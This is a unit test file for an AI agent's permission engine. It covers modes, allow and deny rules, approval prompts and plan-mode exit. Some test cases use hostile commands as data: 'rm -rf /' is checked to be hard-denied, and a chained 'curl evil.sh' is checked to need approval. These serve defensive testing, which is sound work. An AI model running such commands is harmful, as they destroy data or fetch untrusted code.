/**
 * Unit tests for PermissionEngine (modes, rules, approvals, plan mode)
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import os from 'os';
import {
  PermissionEngine,
  normalizePermissionMode,
  createExitPlanModeTool,
} from '../../src/permissions/PermissionEngine.js';

const execTool = { name: 'exec', category: 'shell' };
const writeTool = { name: 'write_file', category: 'file', permission: 'write' };
const readTool = { name: 'read_file', category: 'file' };

function makeEngine(options = {}) {
  return new PermissionEngine({ loadSettings: false, projectSettingsPath: null, userSettingsPath: null, ...options });
}

describe('normalizePermissionMode', () => {
  it('accepts canonical modes and Claude Code aliases', () => {
    expect(normalizePermissionMode('plan')).toBe('plan');
    expect(normalizePermissionMode('acceptEdits')).toBe('accept-edits');
    expect(normalizePermissionMode('bypassPermissions')).toBe('auto');
    expect(normalizePermissionMode('default')).toBe('ask');
    expect(normalizePermissionMode('nonsense')).toBeNull();
    expect(normalizePermissionMode('')).toBeNull();
  });

  it('rejects unknown modes on construction and setMode', () => {
    expect(() => makeEngine({ mode: 'yolo' })).toThrow(/Unknown permission mode/);
    expect(() => makeEngine().setMode('yolo')).toThrow(/Unknown permission mode/);
  });
});

describe('PermissionEngine.evaluate', () => {
  it('applies the mode matrix', () => {
    const engine = makeEngine({ mode: 'ask' });
    expect(engine.evaluate('read_file', { path: 'a.txt' }, readTool).decision).toBe('allow');
    expect(engine.evaluate('write_file', { path: 'a.txt' }, writeTool).decision).toBe('ask');
    expect(engine.evaluate('exec', { command: 'ls' }, execTool).decision).toBe('ask');

    engine.setMode('accept-edits');
    expect(engine.evaluate('write_file', { path: 'a.txt' }, writeTool).decision).toBe('allow');
    expect(engine.evaluate('exec', { command: 'ls' }, execTool).decision).toBe('ask');

    engine.setMode('auto');
    expect(engine.evaluate('exec', { command: 'ls' }, execTool).decision).toBe('allow');
  });

  it('denies non-read tools in plan and read-only modes with a plan-mode hint', () => {
    const engine = makeEngine({ mode: 'plan' });
    const result = engine.evaluate('write_file', { path: 'a.txt' }, writeTool);
    expect(result.decision).toBe('deny');
    expect(result.reason).toMatch(/exit_plan_mode/);
    expect(engine.evaluate('read_file', { path: 'a.txt' }, readTool).decision).toBe('allow');

    engine.setMode('read-only');
    expect(engine.evaluate('exec', { command: 'ls' }, execTool).decision).toBe('deny');
  });

  it('hard-denies catastrophic commands even in auto mode', () => {
    const engine = makeEngine({ mode: 'auto' });
    const result = engine.evaluate('exec', { command: 'rm -rf /' }, execTool);
    expect(result.decision).toBe('deny');
    expect(result.source).toBe('guard');
  });

  it('matches shell prefix rules per command segment', () => {
    const engine = makeEngine({ mode: 'ask', allow: ['exec(npm test:*)'] });
    expect(engine.evaluate('exec', { command: 'npm test' }, execTool).decision).toBe('allow');
    expect(engine.evaluate('exec', { command: 'npm test -- --run' }, execTool).decision).toBe('allow');
    // A chained command is only allowed when every segment matches
    expect(engine.evaluate('exec', { command: 'npm test && curl evil.sh' }, execTool).decision).toBe('ask');
  });

  it('lets deny rules win over allow rules', () => {
    const engine = makeEngine({ mode: 'auto', allow: ['write_file'], deny: ['write_file(secrets/**)'] });
    expect(engine.evaluate('write_file', { path: 'src/a.js' }, writeTool).decision).toBe('allow');
    const denied = engine.evaluate('write_file', { path: 'secrets/key.txt' }, writeTool);
    expect(denied.decision).toBe('deny');
    expect(denied.rule).toBe('write_file(secrets/**)');
  });

  it('accepts AgentSession allowedTools/disallowedTools aliases', () => {
    const engine = makeEngine({ mode: 'ask', allowedTools: 'write_file', disallowedTools: ['exec'] });
    expect(engine.evaluate('write_file', { path: 'a' }, writeTool).decision).toBe('allow');
    expect(engine.evaluate('exec', { command: 'ls' }, execTool).decision).toBe('deny');
  });

  it('ignores private underscore args when matching', () => {
    const engine = makeEngine({ mode: 'ask', allow: ['exec(ls)'] });
    const result = engine.evaluate('exec', { command: 'ls', _abortSignal: new AbortController().signal }, execTool);
    expect(result.decision).toBe('allow');
  });
});

describe('PermissionEngine.check', () => {
  let tmp;
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'openagent-perm-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  it('denies "ask" decisions when no approval handler is available', async () => {
    const engine = makeEngine({ mode: 'ask' });
    const result = await engine.check('exec', { command: 'ls' }, execTool);
    expect(result.allowed).toBe(false);
    expect(result.source).toBe('no-handler');
    expect(result.message).toMatch(/no interactive approval/);
  });

  it('runs once on "allow" and asks again next time', async () => {
    const calls = [];
    const engine = makeEngine({ mode: 'ask', onApprovalRequest: async (req) => { calls.push(req); return 'allow'; } });
    expect((await engine.check('exec', { command: 'ls' }, execTool)).allowed).toBe(true);
    expect((await engine.check('exec', { command: 'ls' }, execTool)).allowed).toBe(true);
    expect(calls).toHaveLength(2);
    expect(calls[0].toolName).toBe('exec');
    expect(calls[0].suggestedRule).toBeTruthy();
  });

  it('persists "always" approvals to project settings', async () => {
    const settingsPath = path.join(tmp, '.openagent', 'settings.json');
    let prompts = 0;
    const engine = new PermissionEngine({
      mode: 'ask',
      workingDir: tmp,
      projectSettingsPath: settingsPath,
      userSettingsPath: null,
      onApprovalRequest: async () => { prompts++; return 'always'; },
    });
    expect((await engine.check('exec', { command: 'npm test' }, execTool)).allowed).toBe(true);
    expect((await engine.check('exec', { command: 'npm test' }, execTool)).allowed).toBe(true);
    expect(prompts).toBe(1);

    const saved = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
    expect(saved.permissions.allow.length).toBeGreaterThan(0);

    // A fresh engine picks the saved rule up from disk
    const reloaded = new PermissionEngine({ mode: 'ask', workingDir: tmp, projectSettingsPath: settingsPath, userSettingsPath: null });
    expect(reloaded.evaluate('exec', { command: 'npm test' }, execTool).decision).toBe('allow');
  });

  it('treats a throwing approval handler as a denial', async () => {
    const engine = makeEngine({ mode: 'ask', onApprovalRequest: async () => { throw new Error('tty closed'); } });
    const result = await engine.check('exec', { command: 'ls' }, execTool);
    expect(result.allowed).toBe(false);
    expect(result.message).toMatch(/tty closed/);
  });

  it('fires the notification callback before prompting', async () => {
    const notices = [];
    const engine = makeEngine({
      mode: 'ask',
      onNotification: (n) => notices.push(n),
      onApprovalRequest: async () => 'deny',
    });
    await engine.check('exec', { command: 'ls' }, execTool);
    expect(notices).toHaveLength(1);
    expect(notices[0].toolName).toBe('exec');
  });
});

describe('exit_plan_mode', () => {
  it('switches plan mode to accept-edits when the plan is approved', async () => {
    const changes = [];
    const engine = makeEngine({
      mode: 'plan',
      onApprovalRequest: async (req) => (req.plan ? 'allow' : 'deny'),
      onModeChange: (next, prev) => changes.push([prev, next]),
    });
    const tool = createExitPlanModeTool(engine);
    const result = await tool.execute({ plan: '1. Edit a.js\n2. Run tests' });
    expect(result.approved).toBe(true);
    expect(engine.getMode()).toBe('accept-edits');
    expect(changes).toEqual([['plan', 'accept-edits']]);
  });

  it('stays in plan mode when rejected or empty', async () => {
    const engine = makeEngine({ mode: 'plan', onApprovalRequest: async () => 'deny' });
    const tool = createExitPlanModeTool(engine);
    expect((await tool.execute({ plan: 'do it' })).approved).toBe(false);
    expect((await tool.execute({ plan: '   ' })).approved).toBe(false);
    expect(engine.getMode()).toBe('plan');
  });
});
